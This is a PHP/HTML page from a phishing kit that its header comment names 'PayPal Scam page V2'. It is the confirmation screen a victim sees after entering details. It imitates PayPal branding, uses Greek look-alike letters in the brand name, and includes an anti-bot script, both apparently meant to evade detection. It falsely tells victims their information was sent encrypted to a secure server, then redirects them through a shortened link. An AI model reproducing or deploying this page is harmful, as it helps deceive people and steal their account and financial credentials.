<?php
/*
PayPal Scam page V2 Coded By Nabil-Tn
*/
include 'antibot.php';
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Sending your information to &Rho;ay&Rho;al</title>
    <link rel="stylesheet" href="css/normalize.css">
    <link rel="stylesheet" href="css/style.css">
	<script src="javascript/jquery-1.11.2.min.js"></script>
	<link rel="shortcut icon" type="image/x-icon" href="./favicon.ico" />
	<meta http-equiv="refresh" content="4; url=https://goo.gl/bUcGqs">
<style>
#msg {
	margin-top: 5px;
	border: 1px solid #3399ff;
	font-size: 14px;
	font-weight: bold;
	padding-top: 5px;
	padding-bottom: 5px;
	padding-right: 10px;
	padding-left: 10px;
	border-radius: 5px;
}
</style>
</head>
<body>
<div id="header">
	<div class="wrapper">
		<img class="logo" src="img/logo_Safety.png" />
		<p>Your security is our &rho;riority</p>
	</div>
</div>
<div class="wrapper">
	<div id="acc">
		<center><img src="img/congratulations.png" width="190"></ /></center>
		<p><h5><center>
Your have u&rho;dated your account access. Now you can use your account as usual.
all information had been sent in encry&rho;ted form to our secure server. Thank you for using &Rho;ay&Rho;al.
</center></h5></p>
<br><br>
 <center><img  src="img/loader.gif" width="70"/> </center>
 		<p><h5>
<center><h5> Redirecting to PayPal home page, wait please ...</center>
		</h5></p>

		</html>